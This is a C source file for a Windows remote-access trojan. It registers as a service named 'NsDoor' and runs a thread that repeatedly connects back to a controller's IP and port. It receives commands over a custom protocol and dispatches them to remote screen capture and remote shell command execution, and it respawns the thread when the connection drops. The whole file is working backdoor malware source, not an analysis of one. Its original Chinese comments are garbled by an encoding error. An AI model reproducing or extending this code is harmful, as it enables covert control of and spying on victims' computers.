#pragma once
#include "Header.h"
#include "RatProto.h"

char szRecvCmd[MAXLENGTH] = {0};
char szSendCmd[MAXLENGTH] = {0};
int dwRecvSize = 0;
int dwSendSize = 0;

void main(int argc, char* argv[]) {
	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)TrojanThread,NULL,NULL,NULL);
	while (TRUE){
		Sleep(1000);
	}
}

int ServiceMain(){
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = "NsDoor";
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;
	// ��������Ŀ��Ʒ��ɻ��߳�
	StartServiceCtrlDispatcher(ServiceTable); 
	return 0;
}

//////////////////////////////////////////////////////////////////////////
//ľ���߳�
void TrojanThread(void){
	SOCKET sockfd = ConnClient();//���ӿ��ƶ�
	while (TRUE){
		BOOL flag = RecvCmd(sockfd);
		if (flag){//����һ����
			flag = DispatchCmd(sockfd,dwRecvSize);
			dwRecvSize = 0;
		}
		if (!flag){
			SocketError(sockfd);
		}
	}
}
//////////////////////////////////////////////////////////////////////////
//���ӿͻ���
SOCKET ConnClient(){
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr = inet_addr(DESTIP);//���ƶ�ip
	sin.sin_port = htons(DESTPORT);//ָ������ͨ�ŵĶ˿�
	sin.sin_family = AF_INET;
	SOCKET sockfd = socket(AF_INET,SOCK_STREAM,NULL);
	while (TRUE){
		Sleep(1000);
		int nRet = connect(sockfd,(LPSOCKADDR)&sin,sizeof(sin));
		if (nRet!=SOCKET_ERROR){
			break;
		}
	}

	return sockfd;
}
//////////////////////////////////////////////////////////////////////////
//��������
BOOL RecvCmd(SOCKET sockfd){
	dwRecvSize = 0;
	BOOL flag = RecvData(sockfd,szRecvCmd,sizeof(RatProto));//�������ݰ�ͷ
	if (!flag){
		return FALSE;
	}
	else if (sizeof(RatProto) > ((RatProto*)szRecvCmd)->RatLen){
		return FALSE;
	}
	int dwSize = ((RatProto*)szRecvCmd)->RatLen - sizeof(RatProto);
	if (dwSize){//��������
		char* pData = szRecvCmd + sizeof(RatProto);
		flag = RecvData(sockfd,pData,dwSize);
		if (!flag){
			return FALSE;
		}
	}
	dwRecvSize = ((RatProto*)szRecvCmd)->RatLen;
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//SOCKET ERROR
BOOL SocketError(SOCKET sockfd){
	dwSendSize = dwRecvSize = 0;
	closesocket(sockfd);//�رյ�ǰsocket
	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)TrojanThread,NULL,NULL,NULL);//���¿�һ��ľ���߳�
	ExitThread(NULL);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//���ƽ��չ̶���������
BOOL RecvData(SOCKET sockfd,char* pData,int dwSize){
	while (TRUE){
		fd_set fdset;
		fdset.fd_count = 1;
		fdset.fd_array[0] = sockfd;
		int nRet = select(NULL,&fdset,NULL,NULL,NULL);
		if (nRet == SOCKET_ERROR){
			return FALSE;
		}
		else{
			nRet = recv(sockfd,pData,dwSize,NULL);
			if (nRet==SOCKET_ERROR || !nRet){
				return FALSE;
			}
		}
		if (nRet < dwSize){
			pData += nRet;
			dwSize -= nRet;
		}
		else break;
	}
	return TRUE;
}
//////////////////////////////////////////////////////////////////////////
//���ַ�����
BOOL DispatchCmd(SOCKET sockfd,int dwSize){
	switch (((RatProto*)szRecvCmd)->RatId){
	case DESK_VIEW: DeskView(sockfd);//Զ�����沶��
		break;
	case CMD_REQUSET:  CmdReply(sockfd, dwSize);//��ӦCMD��Ϣ
		break;
	default:
		return FALSE;
	}

	return TRUE;
}
//////////////////////////////////////////////////////////////////////////
//��������
BOOL SendCmd(SOCKET sockfd,char* pData,int dwSize){
	int nRet = send(sockfd,pData,dwSize,NULL);
	if (nRet == SOCKET_ERROR){
		SocketError(sockfd);
		return FALSE;
	}
	else return TRUE;
}